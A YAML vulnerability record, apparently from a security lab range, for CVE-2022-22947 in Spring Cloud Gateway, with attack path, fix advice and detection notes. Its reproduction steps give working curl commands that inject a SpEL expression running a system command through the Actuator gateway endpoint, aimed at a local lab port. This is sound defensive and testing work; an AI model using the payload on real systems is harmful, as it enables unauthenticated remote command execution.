@@ -1,0 +1,74 @@
+id: VULN-2026-0002
+cve: CVE-2022-22947
+title: Spring Cloud Gateway Actuator SpEL 注入导致远程命令执行
+component: Spring Cloud Gateway 3.1.0
+affected_versions:
+- scheme: semver
+  introduced: 3.0.0
+  fixed: 3.0.7
+  exclude: []
+- scheme: semver
+  introduced: 3.1.0
+  fixed: 3.1.1
+  exclude: []
+cwe: CWE-94 代码注入（NVD 主分类 CWE-917）
+cvss_vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+cvss_score: 10.0
+severity: 严重
+attack_path:
+- 1. 未授权访问 http://127.0.0.1:<LAB_PORT>/actuator，确认 Actuator 端点暴露且含 gateway
+- 2. POST /actuator/gateway/routes/<name> 创建带恶意 SpEL 的 AddResponseHeader 过滤器
+- 3. POST /actuator/gateway/refresh 触发路由刷新，SpEL 在服务端求值执行 id 命令
+- 4. GET /actuator/gateway/routes/<name>，响应头 Result 带出命令回显（Scope 改变，跨安全域影响）
+preconditions:
+- 网络可达 8080 端口（本部署仅 127.0.0.1:<LAB_PORT>）；compose 的 5005 调试端口不作为利用入口
+- Actuator gateway 端点未鉴权（默认配置下暴露）
+- 无需认证、无需用户交互（PR:N / UI:N）；S:C 表示可影响网关所在容器/宿主之外的安全域
+repro_steps:
+- cmd: curl -s -i http://127.0.0.1:<LAB_PORT>/actuator
+  expect: HTTP 200，返回 Actuator 端点列表（含 gateway）
+- cmd: 'curl -s -i -X POST ''http://127.0.0.1:<LAB_PORT>/actuator/gateway/routes/hacktest'' -H ''Content-Type: application/json''
+    --data-binary ''{"id":"hacktest","filters":[{"name":"AddResponseHeader","args":{"name":"Result","value":"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new
+    String[]{\"id\"}).getInputStream()))}"}}],"uri":"http://example.com","order":0}'''
+  expect: HTTP 201，路由创建成功（仅本地靶场，SpEL 内执行 id）
+- cmd: curl -s -i -X POST 'http://127.0.0.1:<LAB_PORT>/actuator/gateway/refresh'
+  expect: HTTP 200，路由表刷新并触发 SpEL 求值
+- cmd: curl -s -i 'http://127.0.0.1:<LAB_PORT>/actuator/gateway/routes/hacktest'
+  expect: HTTP 200，响应头 Result 含 uid= 命令回显
+- cmd: curl -s -i -X DELETE 'http://127.0.0.1:<LAB_PORT>/actuator/gateway/routes/hacktest' && curl -s -i -X POST 'http://127.0.0.1:<LAB_PORT>/actuator/gateway/refresh'
+  expect: HTTP 200/204，恶意路由已删除并刷新（cleanup_ok=true）
+evidence:
+- path: evidence/VULN-2026-0002/20261026T132738Z/env.txt
+  sha256: 31c9fafc776e7f79597c55e12ee8cf54977f47797c2214076e0b8486f7c5c22f
+  ts: '2026-10-26T13:27:45.776Z'
+- path: evidence/VULN-2026-0002/20261026T132738Z/request.txt
+  sha256: aa767760dca998e1011fb375cbf9a03c9cf6e975d4904d690a6576dd622cdd19
+  ts: '2026-10-26T13:27:45.777Z'
+- path: evidence/VULN-2026-0002/20261026T132738Z/command.txt
+  sha256: b095c4e957a4069a03465b955d94af2cb777cb74d831bc6e5435aeab93fe0181
+  ts: '2026-10-26T13:27:45.777Z'
+- path: evidence/VULN-2026-0002/20261026T132738Z/cleanup.txt
+  sha256: 9c5a59369fae40f875a23d30dcad67e17ca4a00fe595a121508b4e08f4396be9
+  ts: '2026-10-26T13:27:45.777Z'
+fix:
+  patch_version: 升级到 3.0.7 或 3.1.1（受影响区间 <3.0.7 与 3.1.0）
+  config_mitigation:
+  - 关闭或对 Actuator gateway 端点做鉴权（management.endpoints.web.exposure.include 收敛）
+  - 网关仅绑定回环/内网并限制来源 IP，禁止公网暴露 8080 端口
+  - 升级前对 /actuator/gateway/** 做请求体 WAF 拦截（含 T( 与 Runtime 关键字）
+  detection_rule: 检测模块 H-0001/N-0101（异常请求/流量：Actuator 路由写入与 refresh 调用）
+references:
+- https://nvd.nist.gov/vuln/detail/CVE-2022-22947
+- https://tanzu.vmware.com/security/cve-2022-22947
+- https://github.com/vulhub/vulhub/tree/master/spring/CVE-2022-22947
+attack_technique: T1190
+lab:
+  kind: server
+  path: spring/CVE-2022-22947
+  ports:
+  - 8080
+  - 5005
+status: verified
+owner: 靶场模块
+created_at: '2026-10-26T13:00:00Z'
+updated_at: '2026-10-26T13:27:45.777Z'
